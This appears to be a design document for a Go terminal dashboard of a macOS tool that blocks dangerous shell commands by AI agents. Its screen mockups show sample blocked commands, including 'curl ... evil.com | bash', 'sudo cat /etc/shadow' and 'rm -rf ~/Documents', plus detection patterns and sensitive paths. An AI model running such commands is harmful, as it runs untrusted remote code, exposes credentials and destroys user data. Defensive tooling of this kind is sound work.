# Sentry TUI — Framework Evaluation & Screen Design

**Date:** 2026-05-30  
**Status:** Decision + Design  
**Binary name:** `sentry-tui` (invoked via `sentryctl tui` or standalone)

---

## 1. Framework Evaluation

### Constraints from ARCHITECTURE.md

> "No Python, no external pip packages, no kexts."
> "pure POSIX shell + macOS builtins + fswatch, open-source, zero heavy frameworks"

The TUI is a **companion tool**, not in the hot path, but should still respect the project philosophy: single binary, zero runtime dependencies, lightweight.

### Bubble Tea (Go) — charmbracelet/bubbletea

| Criterion | Rating | Notes |
|-----------|--------|-------|
| Runtime deps | ★★★★★ | Single static binary. No runtime, no interpreter, no pip. |
| Distribution | ★★★★★ | `brew install` or drop-in binary. Cross-compile trivially. |
| Real-time streaming | ★★★★★ | Native goroutines + `tea.Program.Send()` for async updates. |
| Component model | ★★★★☆ | Elm architecture (Model/Update/View). Clean, testable. |
| Styling | ★★★★★ | lipgloss (same team) — declarative, theme-aware, box/border/padding. |
| Widget ecosystem | ★★★★☆ | bubbles: list, table, viewport, textinput, spinner, timer, progress. |
| Learning curve | ★★★☆☆ | Go is new to this project; Elm pattern takes 1-2 days. |
| Community | ★★★★★ | 28k+ GitHub stars, active development, large ecosystem. |
| Size on disk | ★★★★★ | ~8-12 MB stripped binary. |
| Integration with shell | ★★★★★ | `os/exec` to call sentryctl/sentry-status.sh. JSON parsing via encoding/json. |

**Key libraries:**
- `charmbracelet/bubbletea` — core framework
- `charmbracelet/lipgloss` — styling (colors, borders, padding, alignment)
- `charmbracelet/bubbles` — pre-built widgets (list, table, viewport, tabs, spinner)
- `charmbracelet/bubbletea/tea` — program lifecycle

### Textual (Python) — textualize/textual

| Criterion | Rating | Notes |
|-----------|--------|-------|
| Runtime deps | ★☆☆☆☆ | Requires Python 3.8+ and `pip install textual` (~30 MB). |
| Distribution | ★★☆☆☆ | Needs virtualenv or system Python. Homebrew formula is complex. |
| Real-time streaming | ★★★★☆ | Async/await with `set_interval` and workers. |
| Component model | ★★★★★ | CSS-based layout, rich widget tree, reactive attributes. |
| Styling | ★★★★★ | TUI CSS — powerful, but overkill for our needs. |
| Widget ecosystem | ★★★★★ | DataTable, Tree, TabbedContent, Markdown, Plotext, Sparkline. |
| Learning curve | ★★★★☆ | Python is familiar; CSS-like layout is intuitive. |
| Community | ★★★★☆ | 25k+ GitHub stars, active. |
| Size on disk | ★★☆☆☆ | Python + Textual + dependencies = ~50-80 MB. |
| Integration with shell | ★★★☆☆ | subprocess module works but adds latency per call. |

### Verdict: **Bubble Tea (Go)**

| Factor | Bubble Tea | Textual |
|--------|-----------|---------|
| Aligns with "no Python, no pip" | ✅ Yes | ❌ Violates core constraint |
| Single binary distribution | ✅ Yes | ❌ Needs Python runtime |
| Memory footprint | ~15 MB | ~80-120 MB |
| Cold start | <50ms | ~500ms-1s |
| Native macOS terminal | ✅ Full support | ✅ Full support |
| Can replace `sentryctl watch` | ✅ Efficiently | ⚠️ Overhead for simple tail |

**Decision:** Bubble Tea wins on every axis that matters to this project. The single-binary, zero-dependency model is non-negotiable for a security tool that protects against AI agents. Adding Python as a runtime dependency would contradict the entire design philosophy.

---

## 2. Screen Designs

### Navigation Model

```
┌──────────────────────────────────────────────────────────────────┐
│  ◉ Status   ○ Violations   ○ Selfguard   ○ Logs   ○ Config     │
│──────────────────────────────────────────────────────────────────│
│                                                                  │
│  [screen content]                                                │
│                                                                  │
│                                                                  │
│                                                                  │
│──────────────────────────────────────────────────────────────────│
│  ← → tabs  ↑↓ navigate  enter select  r refresh  q quit        │
└──────────────────────────────────────────────────────────────────┘
```

Tab navigation with `←`/`→` or number keys `1-5`. Each tab is a Bubble Tea model composed into the root model.

---

### Screen 1: Status (Dashboard)

The home screen. Shows health at a glance. Auto-refreshes every 5 seconds.

```
┌──────────────────────────────────────────────────────────────────┐
│  ◉ Status   ○ Violations   ○ Selfguard   ○ Logs   ○ Config     │
│──────────────────────────────────────────────────────────────────│
│                                                                  │
│  ┌─ Agentic Sentry ──────────────────────────────────┐  │
│  │                                                            │  │
│  │  Mode:          soft-block              Health: 85/100     │  │
│  │  Host:          Traviss-MacBook-Pro                       │  │
│  │  Uptime:        3d 14h 22m                               │  │
│  │                                                            │  │
│  └────────────────────────────────────────────────────────────┘  │
│                                                                  │
│  ┌─ Components ──────────────────────────────────────────────┐  │
│  │  ✓ fswatch monitor        PID 48291     watching 12 paths │  │
│  │  ✓ selfguard              PID 48305     baseline OK       │  │
│  │  ○ egress watcher         not running                     │  │
│  │  ✓ launchd agent          loaded                          │  │
│  │  ✓ fswatch binary         v1.4.8                          │  │
│  │  ✓ jq                     installed                       │  │
│  └────────────────────────────────────────────────────────────┘  │
│                                                                  │
│  ┌─ Events (last 24h) ───────────────────────────────────────┐  │
│  │  Total: 1,247    Blocked: 23    Hard: 2    Detected: 41   │  │
│  │                                                            │  │
│  │  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░░  82% safe          │  │
│  └────────────────────────────────────────────────────────────┘  │
│                                                                  │
│  ┌─ Recent Activity ─────────────────────────────────────────┐  │
│  │  14:32:01  SOFT_BLOCKED  rm outside allowed project dirs  │  │
│  │  14:28:44  DETECTED       sudo access attempt              │  │
│  │  14:15:03  ALLOWED        normal ls operation              │  │
│  │  13:58:17  SOFT_BLOCKED   curl | bash pattern              │  │
│  │  13:44:22  ALLOWED        normal cd operation              │  │
│  └────────────────────────────────────────────────────────────┘  │
│                                                                  │
│──────────────────────────────────────────────────────────────────│
│  ← → tabs  ↑↓ navigate  enter select  r refresh  q quit        │
└──────────────────────────────────────────────────────────────────┘
```

**Data source:** `sentry-status.sh --json` (single call, parses JSON response)

**Refresh:** Background goroutine polls every 5s, sends `StatusUpdateMsg` to Bubble Tea.

**Color coding:**
- ✓ green (running/OK)
- ○ yellow (not running, optional)
- ✗ red (failed, critical)
- Health bar: green >80, yellow 50-80, red <50

---

### Screen 2: Violations

Detailed violation analytics. Static view, refresh on demand.

```
┌──────────────────────────────────────────────────────────────────┐
│  ○ Status   ◉ Violations   ○ Selfguard   ○ Logs   ○ Config     │
│──────────────────────────────────────────────────────────────────│
│                                                                  │
│  ┌─ Summary ─────────────────────────────────────────────────┐  │
│  │  Total: 1,247 events                                      │  │
│  │  Time range: 2026-05-27 → 2026-05-30                      │  │
│  │                                                            │  │
│  │  ┌─────────────┐ ┌─────────────┐ ┌─────────────┐         │  │
│  │  │  Blocked     │ │  Hard       │ │  Detected   │         │  │
│  │  │     23       │ │     2       │ │    41       │         │  │
│  │  │  ████████    │ │  ██         │ │  ██████████ │         │  │
│  │  └─────────────┘ └─────────────┘ └─────────────┘         │  │
│  └────────────────────────────────────────────────────────────┘  │
│                                                                  │
│  ┌─ Top Violation Reasons ───────────────────────────────────┐  │
│  │   12  rm outside allowed project dirs                      │  │
│  │    8  sudo / privilege escalation                          │  │
│  │    5  sensitive path access (~/.ssh)                       │  │
│  │    4  curl | bash pattern                                  │  │
│  │    3  network configuration change                         │  │
│  │    2  exec bypass attempt                                  │  │
│  └────────────────────────────────────────────────────────────┘  │
│                                                                  │
│  ┌─ Most-Triggered Commands ─────────────────────────────────┐  │
│  │    6  rm -rf ~/Documents                                   │  │
│  │    4  sudo cat /etc/shadow                                 │  │
│  │    3  curl -s http://evil.com | bash                       │  │
│  │    3  rm -rf /tmp/important                                │  │
│  │    2  chmod 777 ~/.ssh/id_rsa                              │  │
│  └────────────────────────────────────────────────────────────┘  │
│                                                                  │
│  ┌─ Severity Breakdown ──────────────────────────────────────┐  │
│  │  Critical:  2 ▓▓                                          │  │
│  │  Warning:  41 ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓               │  │
│  │  Info:   1204 ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ │  │
│  └────────────────────────────────────────────────────────────┘  │
│                                                                  │
│──────────────────────────────────────────────────────────────────│
│  ← → tabs  ↑↓ navigate  r refresh  e export  q quit            │
└──────────────────────────────────────────────────────────────────┘
```

**Data source:** `sentry-status.sh --violations --json` + parse the audit log.

**Interactions:**
- `e` — export current view to CSV
- `↑↓` — scroll through top reasons / commands if list is long (bubbles/viewport)

---

### Screen 3: Selfguard

Integrity and self-protection status. Critical for trust.

```
┌──────────────────────────────────────────────────────────────────┐
│  ○ Status   ○ Violations   ◉ Selfguard   ○ Logs   ○ Config     │
│──────────────────────────────────────────────────────────────────│
│                                                                  │
│  ┌─ Self-Protection Status ──────────────────────────────────┐  │
│  │                                                            │  │
│  │  Monitor:    ✓ Running (PID 48305, uptime 3d 14h)         │  │
│  │  Mode:       fswatch + periodic hash check                 │  │
│  │  Interval:   30s                                           │  │
│  │                                                            │  │
│  └────────────────────────────────────────────────────────────┘  │
│                                                                  │
│  ┌─ Integrity Chain ─────────────────────────────────────────┐  │
│  │                                                            │  │
│  │  Baseline file:  sentry-baseline.sha256                    │  │
│  │  Updated:        2026-05-27 09:14                          │  │
│  │  Hash:           a7f3...e291 (SHA-256)                     │  │
│  │  Status:         ✓ VERIFIED                                │  │
│  │                                                            │  │
│  │  Meta-hash:      meta.sha256                               │  │
│  │  Meta-meta:      meta-meta.sha256                          │  │
│  │  Chain:          ✓ BASELINE → META → META-META  intact    │  │
│  │                                                            │  │
│  └────────────────────────────────────────────────────────────┘  │
│                                                                  │
│  ┌─ Protected Files (14) ────────────────────────────────────┐  │
│  │  ✓ sandbox-hooks.zsh           a3f2...9c01                 │  │
│  │  ✓ sandbox-monitor.fswatch.sh  b7e1...4d22                 │  │
│  │  ✓ enforcement_recovery_module  c9d4...1e83                 │  │
│  │  ✓ sentry-selfguard.sh         d2a8...7f54                 │  │
│  │  ✓ sentry-logger.sh            e1c3...0a97                 │  │
│  │  ✓ sentry-status.sh            f4b6...3c18                 │  │
│  │  ✓ sentryctl                   g8d9...5e40                 │  │
│  │  ▼ 7 more files...                                        │  │
│  └────────────────────────────────────────────────────────────┘  │
│                                                                  │
│  ┌─ Recent Selfguard Events ─────────────────────────────────┐  │
│  │  14:30:00  ✓ periodic check passed                        │  │
│  │  14:29:30  ✓ periodic check passed                        │  │
│  │  14:29:00  ✓ periodic check passed                        │  │
│  └────────────────────────────────────────────────────────────┘  │
│                                                                  │
│──────────────────────────────────────────────────────────────────│
│  ← → tabs  ↑↓ scroll  v verify now  b re-baseline  q quit      │
└──────────────────────────────────────────────────────────────────┘
```

**Data sources:**
- `sentry-selfguard.sh status --json` (monitor status, chain integrity)
- Read baseline file for protected file list
- Tail selfguard log for recent events

**Interactions:**
- `v` — trigger immediate verification (`sentry-selfguard.sh verify`)
- `b` — re-compute baseline (requires confirmation dialog)
- `↑↓` — scroll protected files list

---

### Screen 4: Logs

Real-time log viewer with filtering. The power-user screen.

```
┌──────────────────────────────────────────────────────────────────┐
│  ○ Status   ○ Violations   ○ Selfguard   ◉ Logs   ○ Config     │
│──────────────────────────────────────────────────────────────────│
│                                                                  │
│  ┌─ Filters ─────────────────────────────────────────────────┐  │
│  │  Search: [rm -rf          ]  Decision: [ALL ▼]             │  │
│  │  Mode:   [ALL ▼]            Since:     [1h ▼]              │  │
│  └────────────────────────────────────────────────────────────┘  │
│                                                                  │
│  ┌─ Log Stream (live ●) ─────────────────────────────────────┐  │
│  │                                                            │  │
│  │  14:32:01 [soft-block] 🛑 SOFT_BLOCKED                    │  │
│  │     rm outside allowed project dirs                        │  │
│  │     cmd: rm -rf ~/Documents/important                      │  │
│  │     cwd: ~/Documents                                       │  │
│  │                                                            │  │
│  │  14:28:44 [soft-block] ⚠  DETECTED                        │  │
│  │     sudo access attempt                                    │  │
│  │     cmd: sudo cat /etc/shadow                              │  │
│  │     cwd: ~/Projects/webapp                                 │  │
│  │                                                            │  │
│  │  14:25:11 [hard]       🛑 HARD_ENFORCEMENT                │  │
│  │     curl | bash pattern detected                           │  │
│  │     cmd: curl -s http://evil.com/script.sh | bash          │  │
│  │     cwd: ~/Downloads                                       │  │
│  │                                                            │  │
│  │  14:15:03 [soft-block] ℹ  ALLOWED                         │  │
│  │     normal operation                                       │  │
│  │     cmd: ls -la                                            │  │
│  │     cwd: ~/Projects/sentry                                 │  │
│  │                                                            │  │
│  │  ▓ (live — new events appear here)                        │  │
│  └────────────────────────────────────────────────────────────┘  │
│                                                                  │
│  Showing 1,247 events  |  Filtered: 23  |  Live: ON            │
│──────────────────────────────────────────────────────────────────│
│  ← → tabs  ↑↓ scroll  / search  f filter  p pause  e export   │
└──────────────────────────────────────────────────────────────────┘
```

**Data sources:**
- Initial load: read audit log file, parse JSON lines
- Live updates: `tail -f` via goroutine, sends `LogLineMsg` to Bubble Tea

**Interactions:**
- `↑↓` — scroll through log history (bubbles/viewport)
- `/` — focus search input (bubbles/textinput), filters in real-time
- `f` — toggle filter dropdown (decision type: ALL / BLOCKED / HARD / DETECTED)
- `p` — pause/resume live stream
- `e` — export filtered view to file
- `Enter` on a log entry — expand to full JSON detail

**Performance:** For large logs (>10k lines), load last 500 on startup, paginate backwards on demand. Use `tail -f` for live append only.

---

### Screen 5: Config (Bonus)

View and modify configuration from the TUI.

```
┌──────────────────────────────────────────────────────────────────┐
│  ○ Status   ○ Violations   ○ Selfguard   ○ Logs   ◉ Config     │
│──────────────────────────────────────────────────────────────────│
│                                                                  │
│  ┌─ Current Configuration ───────────────────────────────────┐  │
│  │                                                            │  │
│  │  Mode:              [soft-block ▼]                         │  │
│  │  Notifications:     [ON ●]                                │  │
│  │  Log level:         [info ▼]                              │  │
│  │  Audit log:         ~/.hermes/logs/sandbox-audit.log       │  │
│  │  Log rotation:      5 MB / 3 files                        │  │
│  │                                                            │  │
│  └────────────────────────────────────────────────────────────┘  │
│                                                                  │
│  ┌─ Allowed Project Directories ─────────────────────────────┐  │
│  │  1. /Users/travis/Documents/Vibe Coding/Agentic-Sandbox   │  │
│  │  2. /Users/travis/Projects/webapp                         │  │
│  │  3. /Users/travis/Projects/api-server                     │  │
│  │                                                            │  │
│  │  [+] Add directory                                        │  │
│  └────────────────────────────────────────────────────────────┘  │
│                                                                  │
│  ┌─ Sensitive Paths (from safety-rules.json) ────────────────┐  │
│  │  ~/.ssh, ~/.gnupg, ~/Library/Keychains, /etc, /System     │  │
│  │  ~/.aws, ~/.config/gcloud, ~/Library/Application Support  │  │
│  └────────────────────────────────────────────────────────────┘  │
│                                                                  │
│  ┌─ Detection Patterns ──────────────────────────────────────┐  │
│  │  rm -rf, sudo, curl|bash, chmod 777, exec, subshell bypass│  │
│  └────────────────────────────────────────────────────────────┘  │
│                                                                  │
│──────────────────────────────────────────────────────────────────│
│  ← → tabs  ↑↓ navigate  enter edit  a add dir  s save  q quit  │
└──────────────────────────────────────────────────────────────────┘
```

**Data source:** `sentryctl config --json` + read `safety-rules.json`

**Interactions:**
- `↑↓` — navigate config items
- `Enter` — edit selected item (dropdown for mode/level, toggle for boolean)
- `a` — add allowed directory (textinput + confirmation)
- `s` — save changes (writes to config via `sentryctl mode` / `sentryctl allow-dir`)

---

## 3. Architecture

### Project Structure

```
tui/
├── main.go              # Entry point, tea.Program setup
├── model.go             # Root model (tab router)
├── update.go            # Root update (key handling, tab switching)
├── view.go              # Root view (header, footer, delegate to active tab)
├── styles.go            # Shared lipgloss styles + color palette
├── api.go               # Shell out to sentryctl/sentry-status.sh, parse JSON
├── tabs/
│   ├── status.go        # Status tab model/update/view
│   ├── violations.go    # Violations tab
│   ├── selfguard.go     # Selfguard tab
│   ├── logs.go          # Logs tab (with live streaming)
│   └── config.go        # Config tab
└── go.mod               # Go module definition
```

### Data Flow

```
sentry-tui
  │
  ├── goroutine: poll sentry-status.sh --json every 5s
  │     └── sends StatusUpdateMsg → tea.Program
  │
  ├── goroutine: tail -f audit log
  │     └── sends LogLineMsg → tea.Program (for Logs tab)
  │
  └── goroutine: poll selfguard log every 10s
        └── sends SelfguardUpdateMsg → tea.Program
```

### Integration with sentryctl

The TUI calls existing sentryctl commands. No new APIs needed:

```
sentryctl status --json        → Status tab data
sentryctl violations --json    → Violations tab data (via sentry-status.sh)
sentryctl selfguard status     → Selfguard tab data
sentryctl logs --json --tail N → Logs tab initial load
sentryctl config               → Config tab data
sentryctl mode <name>          → Config tab mode switch
sentryctl allow-dir <path>     → Config tab add directory
```

### Build & Install

```bash
# Build
cd tui && go build -o sentry-tui .

# Install (via sentryctl)
sentryctl tui    # wrapper that runs sentry-tui if binary exists

# Homebrew
brew install agentic-sentry  # includes sentry-tui
```

### Launch

```bash
sentryctl tui          # from sentryctl
sentry-tui             # standalone
sentry-tui --tab logs  # open specific tab
```

---

## 4. Color Palette

Consistent with existing sentryctl color scheme:

| Token | Color | Usage |
|-------|-------|-------|
| Normal | Terminal default | Regular text |
| Muted | #626262 (dim) | Hints, timestamps, secondary info |
| Accent | #04B575 (green) | OK status, safe operations, running |
| Warning | #FFD700 (yellow) | Warnings, detected events, optional |
| Danger | #FF4672 (red) | Blocked, hard enforcement, failed |
| Info | #7C3AED (purple) | Headers, section titles |
| Highlight | #00DFFF (cyan) | Interactive elements, selection |
| Border | #3C3C3C | Box borders, dividers |

Dark-mode first. Light mode: invert borders and mute colors slightly.

---

## 5. Key Bindings

| Key | Action | Global |
|-----|--------|--------|
| `←` / `→` | Switch tabs | ✓ |
| `1-5` | Jump to tab | ✓ |
| `↑` / `↓` | Scroll / navigate | Per-tab |
| `Enter` | Select / expand | Per-tab |
| `r` | Refresh current view | ✓ |
| `q` / `Ctrl-C` | Quit | ✓ |
| `/` | Focus search (Logs tab) | Logs only |
| `p` | Pause/resume live stream | Logs only |
| `e` | Export current view | Violations, Logs |
| `v` | Verify integrity now | Selfguard only |
| `b` | Re-baseline (with confirm) | Selfguard only |
| `?` | Toggle keybinding help overlay | ✓ |

---

## 6. Implementation Priority

| Phase | Scope | Effort |
|-------|-------|--------|
| **Phase 1** | Status tab + tab router + basic styles | 2-3 days |
| **Phase 2** | Logs tab with live streaming + filtering | 2-3 days |
| **Phase 3** | Violations tab + Selfguard tab | 2 days |
| **Phase 4** | Config tab + interactive editing | 2 days |
| **Phase 5** | Polish: animations, help overlay, responsive resize | 1-2 days |

Total: ~10-12 days for a complete, polished TUI.

---

## 7. Future Enhancements

- **Sparkline** of events over time (charmbracelet/spinners or custom)
- **Notification toast** when enforcement triggers (overlay bubble)
- **Diff view** for baseline changes (selfguard)
- **Mouse support** (bubbletea supports it natively)
- **Configurable refresh intervals** via config file
- **Multi-host monitoring** (SSH to remote sentry instances)
